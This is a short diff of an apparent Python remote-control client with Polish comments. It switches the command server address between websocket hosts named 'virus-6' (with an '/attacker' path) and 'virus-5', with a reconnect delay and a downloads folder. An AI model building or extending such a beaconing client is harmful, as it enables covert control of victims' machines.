@@ -12,7 +12,7 @@ except ImportError:
     exit(1)
 
 # ─── Konfiguracja ───────────────────────────────────────────────
-SERVER_URL = "wss://virus-6.onrender.com/attacker"
+SERVER_URL = "wss://virus-5.onrender.com"
 RECONNECT_DELAY = 5
 SAVE_DIR = os.path.join(os.path.dirname(__file__), "downloads")
 # ────────────────────────────────────────────────────────────────
